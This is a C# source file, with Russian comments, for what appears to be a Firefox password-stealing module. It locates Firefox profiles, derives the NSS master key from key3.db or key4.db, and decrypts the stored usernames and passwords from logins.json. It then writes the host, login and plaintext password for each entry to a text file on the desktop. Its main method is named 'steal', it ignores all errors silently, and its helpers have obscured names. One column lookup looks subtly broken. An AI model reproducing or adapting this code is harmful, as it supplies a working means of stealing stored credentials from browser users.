using mozila_passwords;
using mozila_passwords.Gecko;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

internal class Firefox
{
    #region Бинарный ключ для расшифровки ключа от паролей

    public static readonly byte[] Key4MagicNumber = new byte[16]
           {
            248,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1
           };

    #endregion

    #region Получение директории
    public static void check()
    {
        string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
        using (StreamWriter stream = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\Mozila_Passwords.txt"))
            foreach (string dir in dirs)
            {
                string[] files = Directory.GetFiles(dir, "logins.json");
                if (files.Length > 0)
                {
                    steal(dir,stream);

                }
            }

    }
    #endregion

    #region Расщифровка данных
    public static void steal(string paths, StreamWriter stream)
    {
                    try
                    {
                        byte[] privatekey = null;
                        if (File.Exists(Path.Combine(paths, "key3.db")))
                        {
                            privatekey = p3k(Path.Combine(paths, "key3.db"));
                        }
                        if (File.Exists(Path.Combine(paths, "key4.db")))
                        {
                            privatekey = p4k(Path.Combine(paths, "key4.db"));
                        }

                        string path = Path.Combine(paths, "logins.json");
                        if (File.Exists(path))
                        {
                            {
                                foreach (JsonValue itema in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
                                {
                                    Gecko4 Gecko4 = Gecko1.Create(Convert.FromBase64String(itema["encryptedUsername"].ToString(saving: false)));
                                    Gecko4 Gecko42 = Gecko1.Create(Convert.FromBase64String(itema["encryptedPassword"].ToString(saving: false)));
                                    string text = Regex.Replace(Gecko6.lTRjlt(privatekey, Gecko4.Objects[0].Objects[1].Objects[1].ObjectData, Gecko4.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                                    string text2 = Regex.Replace(Gecko6.lTRjlt(privatekey, Gecko42.Objects[0].Objects[1].Objects[1].ObjectData, Gecko42.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
                        stream.WriteLine("HOST : " + itema["hostname"]);
                        stream.WriteLine("LOGIN  : " + text);
                        stream.WriteLine("PASSWORD : " + text2);
                        stream.WriteLine("---------------------------------------------------------------");
                                }
                            }
                        }
                    }
                    catch (Exception)
                    {
                    }

                }

    #endregion

    #region Получение p4 ключа
    private static byte[] p4k(string file)
    {
        byte[] result = new byte[24];
        try
        {
            if (!File.Exists(file))
            {
                return result;
            }
            Sqlite cNT = new Sqlite(file);
            cNT.ReadTable("metaData");
            string s = cNT.GetValue(0, "item1");
            string s2 = cNT.GetValue(0, "item2)");
            Gecko4 Gecko4 = Gecko1.Create(Encoding.Default.GetBytes(s2));
            byte[] objectData = Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
            byte[] objectData2 = Gecko4.Objects[0].Objects[1].ObjectData;
            Gecko8 Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
            Gecko8.го7па();
            Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2);
            cNT.ReadTable("nssPrivate");
            int rowLength = cNT.GetRowCount();
            string s3 = string.Empty;
            for (int i = 0; i < rowLength; i++)
            {
                if (cNT.GetValue(i, "a102") == Encoding.Default.GetString(Key4MagicNumber))
                {
                    s3 = cNT.GetValue(i, "a11");
                    break;
                }
            }
            Gecko4 Gecko42 = Gecko1.Create(Encoding.Default.GetBytes(s3));
            objectData = Gecko42.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
            objectData2 = Gecko42.Objects[0].Objects[1].ObjectData;
            Gecko8 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
            Gecko8.го7па();
            result = Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, objectData2, PaddingMode.PKCS7));
            return result;
        }
        catch (Exception)
        {
            return result;
        }
    }
    #endregion

    #region Получение p3 ключа для старой мозиллы
    private static byte[] p3k(string file)
    {
        byte[] array = new byte[24];
        try
        {
            if (!File.Exists(file))
            {
                return array;
            }
            new DataTable();
            Gecko9 berkeleyDB = new Gecko9(file);
            Gecko7 Gecko7 = new Gecko7(vbv(berkeleyDB, (string x) => x.Equals("password-check")));
            string hexString = vbv(berkeleyDB, (string x) => x.Equals("global-salt"));
            Gecko8 Gecko8 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), ConvertHexStringToByteArray(Gecko7.EntrySalt));
            Gecko8.го7па();
            Gecko6.lTRjlt(Gecko8.DataKey, Gecko8.DataIV, ConvertHexStringToByteArray(Gecko7.Passwordcheck));
            Gecko4 Gecko4 = Gecko1.Create(ConvertHexStringToByteArray(vbv(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
            Gecko8 Gecko82 = new Gecko8(ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), Gecko4.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
            Gecko82.го7па();
            Gecko4 Gecko42 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(Gecko82.DataKey, Gecko82.DataIV, Gecko4.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
            if (Gecko42.Objects[0].Objects[3].ObjectData.Length <= 24)
            {
                array = Gecko42.Objects[0].Objects[3].ObjectData;
                return array;
            }
            Array.Copy(Gecko42.Objects[0].Objects[3].ObjectData, Gecko42.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
            return array;
        }
        catch (Exception)
        {
            return array;
        }
    }
    #endregion

    #region Конвертрование ключа из бд в массив байтов
    public static byte[] ConvertHexStringToByteArray(string hexString)
    {
        if (hexString.Length % 2 != 0)
        {
            throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
        }
        byte[] array = new byte[hexString.Length / 2];
        for (int i = 0; i < array.Length; i++)
        {
            string s = hexString.Substring(i * 2, 2);
            array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
        }
        return array;
    }
    #endregion

    #region Обработка ключа
    private static string vbv(Gecko9 berkeleyDB, Func<string, bool> predicate)
    {
        string text = string.Empty;
        try
        {
            foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
            {
                if (predicate(key.Key))
                {
                    text = key.Value;
                }
            }
        }
        catch (Exception)
        {
        }
        return text.Replace("-", string.Empty);
    }
    #endregion
}

